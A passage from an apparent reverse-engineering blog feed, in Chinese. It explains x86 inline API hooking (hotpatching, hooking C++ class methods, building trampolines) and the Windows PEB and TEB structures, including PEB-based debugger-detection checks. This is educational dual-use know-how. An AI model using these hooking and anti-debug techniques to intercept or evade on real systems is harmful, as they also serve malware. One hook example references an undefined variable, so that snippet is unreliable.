src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210330202948.png" alt="inline_hook007"></p><h3 id="Other-Methods"><a href="#Other-Methods" class="headerlink" title="Other Methods"></a>Other Methods</h3><p>除此之外，我们还将讨论一些其他适用面不是那么广，但是在某些时候有奇效的方法。</p><h4 id="Other-Methods-I-Hotpatching"><a href="#Other-Methods-I-Hotpatching" class="headerlink" title="Other Methods I: Hotpatching"></a>Other Methods I: Hotpatching</h4><p>这是特定于使用Microsoft Visual C ++编译器编译的软件的方法，该软件启用了Hotpatching标志（许多dll（例如user32.dll）就是这种情况。）</p><p>如果一个函数接受了所谓的Hotpatch，那么它已经以某种方式准备好了;函数的第一条指令是mov edi, edi指令(长度为两个字节)，在函数本身之前有5条nop指令。这允许在函数地址(覆盖mov edi, edi指令)处放置一个短跳转(该跳转具有8位的相对偏移量，长度为两个字节)，并在nop指令处放置一个32位的相对偏移量的普通跳转。</p><p>请注意，除了对此类函数进行Hotpatching之外，还可以使用本文中介绍的其他方法之一来挂起函数，方法是将钩子放在address函数+2上，其中两个表示为Hotpatching插入的指令大小。</p><p>（通过这种方式，即使我们已经将函数与我们最喜欢的方法之一挂钩，仍然可以应用Hotpatch。）其中2表示为Hotpatching插入的指令大小。(通过这种方式，我们仍然可以应用Hotpatch，即使我们已经将该函数与我们最喜欢的方法之一挂钩。)</p><p>如下图：其中funcA是要挂钩的函数，funcB是执行执行的函数。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210330203045.png" alt="inline_hook008"></p><h4 id="Other-Methods-II-C-Class-Methods"><a href="#Other-Methods-II-C-Class-Methods" class="headerlink" title="Other Methods II: C++ Class Methods"></a>Other Methods II: C++ Class Methods</h4><p>这个方法是关于c++类方法的挂钩。这些函数使用<strong>thiscall</strong>调用约定(至少在windows上是这样的)。</p><p>这个特定的调用约定在调用类方法之前，会先对象信息(可以通过类方法中的this变量引用)存储在ecx寄存器中。换句话说，如果我们想钩住一个类方法，则需要特别注意。</p><p>为了进一步说明，我们将使用以下代码，该代码定义了我们要挂钩的函数（funcA）。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">funcA</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;value: %d %d %d\n&quot;</span>, a, b, c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>除此之外，由于我们想使用常规C函数来钩挂C ++函数，因此我们有兴趣将this指针作为钩子函数的第一个参数。我们的挂钩函数的示例如下所示，其中包括trampoline</p><p>（将在后面进行讨论。）请注意，我们使用变量名self代替了它，因为这是C ++中的保留关键字。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> (*trampoline_funcA)(<span class="keyword">void</span> *self, <span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">funcB</span><span class="params">(<span class="keyword">void</span> *self, <span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> trampoline_funcA(self, a+ <span class="number">1</span>, value + <span class="number">2</span>, value + <span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了能够将C ++类方法与普通C源码挂钩，我们需要稍微修改一下堆栈，因为我们必须将this指针压入其中。</p><p>下图显示了调用funcA时的堆栈布局，其后是调用funcB时所需的布局（hook函数）。</p><p>请注意，ecx包含this指针，栈顶是retn_addr所在的地址。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210330203148.png" alt="inline_hook009"></p><p>我们可以在两个指令中将this指针放入堆栈中。</p><p>第一步是交换this指针(ecx寄存器)和栈顶(retn_addr)。交换之后，this指针位于堆栈顶部，而return_address位于ecx寄存器中。从这里开始，我们可以简单地将ecx寄存器压入堆栈，堆栈将与我们想要的完全一样。</p><p>如下图所示：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210330203207.png" alt="inline_hook010"></p><p>这就是挂钩的部分。然而，我们也必须调整我们的trampoline，因为trampoline接受这个指针作为第一个参数。我们所拥有的和我们想要的堆栈如下所示。(这个值显然应该随后存储到ecx寄存器中)。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210330203236.png" alt="inline_hook011"></p><p>我们做的与hook函数完全相反;</p><p>我们首先将return_address弹出堆栈，因此栈顶指向此地址，并且ecx寄存器中装入了return_address。现在，我们交换堆栈的顶部和ecx寄存器，之后堆栈看起来像我们想要的，并且ecx寄存器加载了this指针。</p><p>下图显示了Trampoline，尽管省略了funcA的指令（即，该图像仅显示了有关C ++类方法Trampoline的特殊之处，而不是我们之前在Trampolines上讨论的内容）。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210330203259.png" alt="inline_hook012"></p><h1 id="构造Trampoline函数"><a href="#构造Trampoline函数" class="headerlink" title="构造Trampoline函数"></a>构造Trampoline函数</h1><p>之前我们简单提了一下构造trampoline函数，现在我们再拿来说说。</p><p>它的基本原理如下：</p><p>我们有一个要挂钩的函数funcA，我们使用最简单的挂钩的方法就是直接jmp，大小为5个字节，由于我们要覆盖前5个字节当中的指令。</p><p>但是也存在这样一种情况：前五个字节的最后一条指令会很长，就像之前我们看到的那样（下图），直接从第3字节跨到第6字节，导致我们需要使用一个nop填充，而且此时我们也不能只是简单地复制前5个字节，而是必须复制整个指令。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210330203417.png" alt="inline_hook001"></p><p>为此，我们使用了所谓的LDE，它是Length Disassembler Engine的缩写，LDE能够计算一条指令的长度。因此我们可以简单地不断获取指令的长度，直到找到足够的指令（至少占5个字节）为止。在上图中，我们花了3条指令才能达到6条长度。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文学习x86下API挂钩的几种方法。&lt;/p&gt;
&lt;p&gt;在下面，我们将学习API挂钩，我们可以用它做什么，为什么API挂钩非常有用，最基本的A</summary>
      
    
    
    
    <category term="Reverse" scheme="http://0xnope.top/categories/Reverse/"/>
    
    
    <category term="Hook" scheme="http://0xnope.top/tags/Hook/"/>
    
  </entry>
  
  <entry>
    <title>PEB</title>
    <link href="http://0xnope.top/2021/03/16/PEB/"/>
    <id>http://0xnope.top/2021/03/16/PEB/</id>
    <published>2021-03-16T05:27:27.000Z</published>
    <updated>2021-03-21T08:22:51.862Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TEB"><a href="#TEB" class="headerlink" title="TEB"></a>TEB</h1><p>介绍PEB（Process Environment Block，进程环境块）之前，我们首先来介绍一下TEB（Thread Environment Block，线程环境块）。</p><p>系统在TEB中<strong>保存频繁使用的线程相关的数据。位于用户地址空间</strong>，在<strong>比 PEB 所在地址低的地方</strong>。进程中的<strong>每个线程都有自己的一个TEB</strong>。</p><p>TEB线程环境块是一个结构体，结构体中包含进程中运行线程的各种信息，每个线程都对应一个TEB结构体。</p><h2 id="重要成员"><a href="#重要成员" class="headerlink" title="重要成员"></a>重要成员</h2><p>结构体中有非常多的成员，其中用户模式调试中起着重要作用的成员有两个：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+0 NtTib : _NT_TIB</span><br><span class="line">...</span><br><span class="line">+0X30 ProcessEnvironmentBlock : Ptr32_PEB</span><br></pre></td></tr></table></figure><ol><li><p><strong>offset0x30处</strong>的ProcessEnvironmentBlock是<strong>指向PEB（进程环境块）结构体的指针</strong></p></li><li><p><strong>offset0处</strong>的_NT_TIB结构体内容如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">    　<span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span></span><br><span class="line">    　PVOID StackBase;</span><br><span class="line">    　PVOID StackLimit;</span><br><span class="line">    　PVOID SubSystemTib;</span><br><span class="line">    　<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    　　PVOID FiberData;</span><br><span class="line">    　　DWORD Version;</span><br><span class="line">    　&#125;;</span><br><span class="line">    　PVOID ArbitraryUserPointer;</span><br><span class="line">    　<span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>ExceptionList成员指向_EXCEPTION_REGISTRATION_RECORD结构体组成的链表，用于Windows OS的SEH（异常处理机制）</li><li>Self成员是结构体的自引用指针[FS:0 偏移0x18后就是_NT_TIB结构体中的self成员，指向这个线程自己的TEB]</li></ul></li></ol><h2 id="FS段寄存器"><a href="#FS段寄存器" class="headerlink" title="FS段寄存器"></a>FS段寄存器</h2><p>FS段寄存器所指定的内存段有着很多和进程、线程相关的信息。也就是说，FS可以用来指示当前线程的TEB结构体。</p><p>FS寄存器指示SDT（段描述符表SDT，一种是全局段描述符表(GDT),另一种是局部段描述符表(LDT), 对应的寄存器分别为GDTR和LDTR）的索引index，其中存放着TEB结构体的偏移地址。 SDT位于内核内存区域，基地址存放在GDTR（全局描述符表寄存器）中。 因此GDTR+FS就可以得到TEB结构体的指针了[也就是FS是选择偏移，GDTR提供基址。最后GDTR+FS得到的地址就是TEB结构体的指针位置。就像系统段描述符和进程的LDT表获取的方法一样]</p><ul><li>FS:[0] = &amp;TIB or &amp;SEH</li></ul><ul><li>FS:[0x18] = FS:0（+0x18处就是self指针）</li><li>FS:[0x30] = &amp;PEB</li></ul><h1 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h1><p>了解了TEB相关信息之后再来说说PEB（Process Environment Block，进程环境块）</p><p>MSDN中给出的文档不是很详细，PEB是一个未公开的结构体。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">32位系统</span><br><span class="line">typedef struct _PEB &#123;</span><br><span class="line">  BYTE                          Reserved1[2];</span><br><span class="line">  BYTE                          BeingDebugged; 标识当前进程是否被调试，在反调试</span><br><span class="line">  BYTE                          Reserved2[1];</span><br><span class="line">  PVOID                         Reserved3[2];</span><br><span class="line">  PPEB_LDR_DATA                 Ldr; </span><br><span class="line">  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;</span><br><span class="line">  BYTE                          Reserved4[104];</span><br><span class="line">  PVOID                         Reserved5[52];</span><br><span class="line">  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">  BYTE                          Reserved6[128];</span><br><span class="line">  PVOID                         Reserved7[1];</span><br><span class="line">  ULONG                         SessionId;</span><br><span class="line">&#125; PEB, *PPEB;</span><br><span class="line">64位系统</span><br><span class="line">typedef struct _PEB &#123;</span><br><span class="line">    BYTE Reserved1[2];</span><br><span class="line">    BYTE BeingDebugged;</span><br><span class="line">    BYTE Reserved2[21];</span><br><span class="line">    PPEB_LDR_DATA LoaderData;</span><br><span class="line">    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;</span><br><span class="line">    BYTE Reserved3[520];</span><br><span class="line">    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">    BYTE Reserved4[136];</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">&#125; PEB;</span><br></pre></td></tr></table></figure><p>windbg下查看R0层面的PEB结构体如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Windows XP SP3下</span></span><br><span class="line"> +<span class="number">0x000</span> InheritedAddressSpace : UChar</span><br><span class="line"> +<span class="number">0x001</span> ReadImageFileExecOptions : UChar</span><br><span class="line"> +<span class="number">0x002</span> BeingDebugged    : UChar  调试标志</span><br><span class="line"> +<span class="number">0x003</span> SpareBool        : UChar</span><br><span class="line"> +<span class="number">0x004</span> Mutant           : Ptr32 Void</span><br><span class="line"> +<span class="number">0x008</span> ImageBaseAddress : Ptr32 Void 映像基址</span><br><span class="line"> +<span class="number">0x00c</span> Ldr              : Ptr32 _PEB_LDR_DATA 进程加载模块链表</span><br><span class="line"> +<span class="number">0x010</span> ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS</span><br><span class="line"> +<span class="number">0x014</span> SubSystemData    : Ptr32 Void</span><br><span class="line"> +<span class="number">0x018</span> ProcessHeap      : Ptr32 Void</span><br><span class="line"> +<span class="number">0x01c</span> FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION</span><br><span class="line"> +<span class="number">0x020</span> FastPebLockRoutine : Ptr32 Void</span><br><span class="line"> +<span class="number">0x024</span> FastPebUnlockRoutine : Ptr32 Void</span><br><span class="line"> +<span class="number">0x028</span> EnvironmentUpdateCount : Uint4B</span><br><span class="line"> +<span class="number">0x02c</span> KernelCallbackTable : Ptr32 Void</span><br><span class="line"> +<span class="number">0x030</span> SystemReserved   : [<span class="number">1</span>] Uint4B</span><br><span class="line"> +<span class="number">0x034</span> AtlThunkSListPtr32 : Uint4B</span><br><span class="line"> +<span class="number">0x038</span> FreeList         : Ptr32 _PEB_FREE_BLOCK</span><br><span class="line"> +<span class="number">0x03c</span> TlsExpansionCounter : Uint4B</span><br><span class="line"> +<span class="number">0x040</span> TlsBitmap        : Ptr32 Void</span><br><span class="line"> +<span class="number">0x044</span> TlsBitmapBits    : [<span class="number">2</span>] Uint4B</span><br><span class="line"> +<span class="number">0x04c</span> ReadOnlySharedMemoryBase : Ptr32 Void</span><br><span class="line"> +<span class="number">0x050</span> ReadOnlySharedMemoryHeap : Ptr32 Void</span><br><span class="line"> +<span class="number">0x054</span> ReadOnlyStaticServerData : Ptr32 Ptr32 Void</span><br><span class="line"> +<span class="number">0x058</span> AnsiCodePageData : Ptr32 Void</span><br><span class="line"> +<span class="number">0x05c</span> OemCodePageData  : Ptr32 Void</span><br><span class="line"> +<span class="number">0x060</span> UnicodeCaseTableData : Ptr32 Void</span><br><span class="line"> +<span class="number">0x064</span> NumberOfProcessors : Uint4B</span><br><span class="line"> +<span class="number">0x068</span> NtGlobalFlag     : Uint4B</span><br><span class="line"> +<span class="number">0x070</span> CriticalSectionTimeout : _LARGE_INTEGER</span><br><span class="line"> +<span class="number">0x078</span> HeapSegmentReserve : Uint4B</span><br><span class="line"> +<span class="number">0x07c</span> HeapSegmentCommit : Uint4B</span><br><span class="line"> +<span class="number">0x080</span> HeapDeCommitTotalFreeThreshold : Uint4B</span><br><span class="line"> +<span class="number">0x084</span> HeapDeCommitFreeBlockThreshold : Uint4B</span><br><span class="line"> +<span class="number">0x088</span> NumberOfHeaps    : Uint4B</span><br><span class="line"> +<span class="number">0x08c</span> MaximumNumberOfHeaps : Uint4B</span><br><span class="line"> +<span class="number">0x090</span> ProcessHeaps     : Ptr32 Ptr32 Void</span><br><span class="line"> +<span class="number">0x094</span> GdiSharedHandleTable : Ptr32 Void</span><br><span class="line"> +<span class="number">0x098</span> ProcessStarterHelper : Ptr32 Void</span><br><span class="line"> +<span class="number">0x09c</span> GdiDCAttributeList : Uint4B</span><br><span class="line"> +<span class="number">0x0a0</span> LoaderLock       : Ptr32 Void</span><br><span class="line"> +<span class="number">0x0a4</span> OSMajorVersion   : Uint4B</span><br><span class="line"> +<span class="number">0x0a8</span> OSMinorVersion   : Uint4B</span><br><span class="line"> +<span class="number">0x0ac</span> OSBuildNumber    : Uint2B</span><br><span class="line"> +<span class="number">0x0ae</span> OSCSDVersion     : Uint2B</span><br><span class="line"> +<span class="number">0x0b0</span> OSPlatformId     : Uint4B</span><br><span class="line"> +<span class="number">0x0b4</span> ImageSubsystem   : Uint4B</span><br><span class="line"> +<span class="number">0x0b8</span> ImageSubsystemMajorVersion : Uint4B</span><br><span class="line"> +<span class="number">0x0bc</span> ImageSubsystemMinorVersion : Uint4B</span><br><span class="line"> +<span class="number">0x0c0</span> ImageProcessAffinityMask : Uint4B</span><br><span class="line"> +<span class="number">0x0c4</span> GdiHandleBuffer  : [<span class="number">34</span>] Uint4B</span><br><span class="line"> +<span class="number">0x14c</span> PostProcessInitRoutine : Ptr32     <span class="keyword">void</span> </span><br><span class="line"> +<span class="number">0x150</span> TlsExpansionBitmap : Ptr32 Void</span><br><span class="line"> +<span class="number">0x154</span> TlsExpansionBitmapBits : [<span class="number">32</span>] Uint4B</span><br><span class="line"> +<span class="number">0x1d4</span> SessionId        : Uint4B</span><br><span class="line"> +<span class="number">0x1d8</span> AppCompatFlags   : _ULARGE_INTEGER</span><br><span class="line"> +<span class="number">0x1e0</span> AppCompatFlagsUser : _ULARGE_INTEGER</span><br><span class="line"> +<span class="number">0x1e8</span> pShimData        : Ptr32 Void</span><br><span class="line"> +<span class="number">0x1ec</span> AppCompatInfo    : Ptr32 Void</span><br><span class="line"> +<span class="number">0x1f0</span> CSDVersion       : _UNICODE_STRING</span><br><span class="line"> +<span class="number">0x1f8</span> ActivationContextData : Ptr32 Void</span><br><span class="line"> +<span class="number">0x1fc</span> ProcessAssemblyStorageMap : Ptr32 Void</span><br><span class="line"> +<span class="number">0x200</span> SystemDefaultActivationContextData : Ptr32 Void</span><br><span class="line"> +<span class="number">0x204</span> SystemAssemblyStorageMap : Ptr32 Void</span><br><span class="line"> +<span class="number">0x208</span> MinimumStackCommit : Uint4B</span><br></pre></td></tr></table></figure><h2 id="PEB重要成员"><a href="#PEB重要成员" class="headerlink" title="PEB重要成员"></a>PEB重要成员</h2><p>PEB结构体非常庞大，并且未公开，我们下面关注几个成员：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">+<span class="number">0x002</span>BeginDebugged:UChar</span><br><span class="line">   +<span class="number">0x008</span>ImageBaseAddress:Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span>Ldr:Ptr32 _PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x068</span>NtGlobalFlag:Uint4B</span><br></pre></td></tr></table></figure><h3 id="PEB-BeginDebugged"><a href="#PEB-BeginDebugged" class="headerlink" title="PEB.BeginDebugged"></a>PEB.BeginDebugged</h3><p>Kernel32.dll当中有个IsDebuggerPresent()的API，该API用于判断当前进程是否处于被调试状态（是，返回1；否，返回0）。其实该API就是通过检测PEB.BeginDebugged成员判断当前进程是否被调试，IsDebuggerPresent()API的汇编代码如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">7</span>C81F424 &gt;  <span class="number">64</span>:A1 <span class="number">18000000</span>  mov eax,dword ptr fs:[<span class="number">0x18</span>]</span><br><span class="line"><span class="number">7</span>C81F42A    <span class="number">8B</span>40 <span class="number">30</span>         mov eax,dword ptr ds:[eax+<span class="number">0x30</span>]</span><br><span class="line"><span class="number">7</span>C81F42D    <span class="number">0F</span>B640 <span class="number">02</span>       movzx eax,byte ptr ds:[eax+<span class="number">0x2</span>]</span><br></pre></td></tr></table></figure><p>先获取FS:[0x18]的TEB的地址，然后通过DS:[TEB+0x30]处的TEB.ProcessEnvironmentBlock成员访问PEB结构体。</p><p>测试程序如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(IsDebuggerPresent() == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No Debugging&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Debugging!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210321154041.png" alt="isDebuggerPresent001"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210321154050.png" alt="isDebuggerPresent002"></p><p>可以看到位于7FFDE002的PEB.BeginDebugged成员的值为1，表明当前被调试（得用原版OD，如果用吾爱的OD测试，PEB.BeginDebugged成员的值为0，直接把IsDebuggerPresent()检测绕过了）。</p><h3 id="PEB-ImageBaseAddress"><a href="#PEB-ImageBaseAddress" class="headerlink" title="PEB.ImageBaseAddress"></a>PEB.ImageBaseAddress</h3><p>PEB.ImageBaseAddress成员用来表示当前进程的ImageBase。</p><p>测试代码：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ImageBase = 0x%d&quot;</span>, GetModuleHandle(<span class="literal">NULL</span>));</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>OD下查看GetModuleHandle(NULL)：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210321160027.png" alt="GetModuleHandle001"></p><p>汇编代码如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">MOV EAX,DWORD PTR FS:[<span class="number">18</span>]</span><br><span class="line">MOV EAX,DWORD PTR DS:[EAX+<span class="number">30</span>]</span><br><span class="line">MOV EAX,DWORD PTR DS:[EAX+<span class="number">8</span>]             ; GetModul<span class="number">.00400000</span></span><br><span class="line">JMP SHORT kernel32<span class="number">.7</span>C80B760</span><br></pre></td></tr></table></figure><h3 id="PEB-Ldr"><a href="#PEB-Ldr" class="headerlink" title="PEB.Ldr"></a>PEB.Ldr</h3><p>PEB.Ldr成员是指向_PEB_LDR_DATA结构体的指针。<strong>进程加载的模块链表</strong>。通过PEB.Ldr成员我们可以直接获取该模块的加载基地址。</p><p>结构体定义如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _peb_ldr_data</span><br><span class="line">ntdll!_PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x000</span> Length           : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> Initialized      : UChar</span><br><span class="line">   +<span class="number">0x008</span> SsHandle         : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> InLoadOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x014</span> InMemoryOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x01c</span> InInitializationOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x024</span> EntryInProgress  : Ptr32 Void</span><br></pre></td></tr></table></figure><p>该结构的后三个成员是指向LDR_MODULE链表结构中相应三条双向链表头的指针，分别是按照加载顺序、在内存中地址顺序和初始化顺序排列的模块信息结构的指针。LDR_MODULE结构，其实就是_LDR_DATA_TABLE_ENTRY结构</p><p>_LDR_DATA_TABLE_ENTRY结构的定义如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _ldr_data_table_entry</span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x008</span> InMemoryOrderLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> InInitializationOrderLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x018</span> DllBase          : Ptr32 Void</span><br><span class="line">   +<span class="number">0x01c</span> EntryPoint       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x020</span> SizeOfImage      : Uint4B</span><br><span class="line">   +<span class="number">0x024</span> FullDllName      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x02c</span> BaseDllName      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x034</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> LoadCount        : Uint2B</span><br><span class="line">   +<span class="number">0x03a</span> TlsIndex         : Uint2B</span><br><span class="line">   +<span class="number">0x03c</span> HashLinks        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x03c</span> SectionPointer   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x040</span> CheckSum         : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> TimeDateStamp    : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> LoadedImports    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x048</span> EntryPointActivationContext : Ptr32 Void</span><br><span class="line">   +<span class="number">0x04c</span> PatchInformation : Ptr32 Void</span><br></pre></td></tr></table></figure><h3 id="PEB-NtGlobalFlag"><a href="#PEB-NtGlobalFlag" class="headerlink" title="PEB.NtGlobalFlag"></a>PEB.NtGlobalFlag</h3><p>NtGlobalFlag（offset=0x68），壳也通过它来检测程序是否用调试器加载。通常程序没有被调试时，NtGlobalFlag成员值为0，如果进程被调试这个成员通常值为0x70。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TEB&quot;&gt;&lt;a href=&quot;#TEB&quot; class=&quot;headerlink&quot; title=&quot;TEB&quot;&gt;&lt;/a&gt;TEB&lt;/h1&gt;&lt;p&gt;介绍PEB（Process Environment Block，进程环境块）之前，我们首先来介绍一下TEB（Thread Envir</summary>
      
    
    
    
    <category term="Reverse" scheme="http://0xnope.top/categories/Reverse/"/>
    
    
    <category term="Windows" scheme="http://0xnope.top/tags/Windows/"/>
    
    <category term="Anti-debug" scheme="http://0xnope.top/tags/Anti-debug/"/>
    
  </entry>
  
  <entry>
    <title>TEB</title>
    <link href="http://0xnope.top/2021/03/15/TEB/"/>
    <id>http://0xnope.top/2021/03/15/TEB/</id>
    <published>2021-03-15T11:43:38.000Z</published>
    <updated>2021-04-05T12:50:04.171Z</updated>
    
    <content type="html"><![CDATA[<h1 id="What-is-TEB"><a href="#What-is-TEB" class="headerlink" title="What is TEB"></a>What is TEB</h1><p>TEB（Thread Environment Block，线程环境块），该结构体包含<strong>进程</strong>中<strong>线程</strong>的各种信息，进程中的每一个线程都对应一个TEB结构体。</p><p>下面是MSDN中Ring3层TEB的解释。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TEB</span> &#123;</span></span><br><span class="line">  PVOID Reserved1[<span class="number">12</span>];</span><br><span class="line">  PPEB  ProcessEnvironmentBlock;</span><br><span class="line">  PVOID Reserved2[<span class="number">399</span>];</span><br><span class="line">  BYTE  Reserved3[<span class="number">1952</span>];</span><br><span class="line">  PVOID TlsSlots[<span class="number">64</span>];</span><br><span class="line">  BYTE  Reserved4[<span class="number">8</span>];</span><br><span class="line">  PVOID Reserved5[<span class="number">26</span>];</span><br><span class="line">  PVOID ReservedForOle;</span><br><span class="line">  PVOID Reserved6[<span class="number">4</span>];</span><br><span class="line">  PVOID TlsExpansionSlots;</span><br><span class="line">&#125; TEB, *PTEB;</span><br></pre></td></tr></table></figure><p>可以看到Ring3层对TEB的说明太过简单，要查看TEB的更多细节需要借助工具WinDbg去Ring0层调试。</p><h2 id="结构体成员"><a href="#结构体成员" class="headerlink" title="结构体成员"></a>结构体成员</h2><p>使用WinDbg调试器获取TEB结构体的信息如下：</p><p>Windows XP SP3中</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">nt!_TEB</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x01c</span> EnvironmentPointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x020</span> ClientId         : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x028</span> ActiveRpcHandle  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x02c</span> ThreadLocalStoragePointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x030</span> ProcessEnvironmentBlock : Ptr32 _PEB</span><br><span class="line">   +<span class="number">0x034</span> LastErrorValue   : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> CountOfOwnedCriticalSections : Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> CsrClientThread  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x040</span> Win32ThreadInfo  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x044</span> User32Reserved   : [<span class="number">26</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0ac</span> UserReserved     : [<span class="number">5</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0c0</span> WOW32Reserved    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0c4</span> CurrentLocale    : Uint4B</span><br><span class="line">   +<span class="number">0x0c8</span> FpSoftwareStatusRegister : Uint4B</span><br><span class="line">   +<span 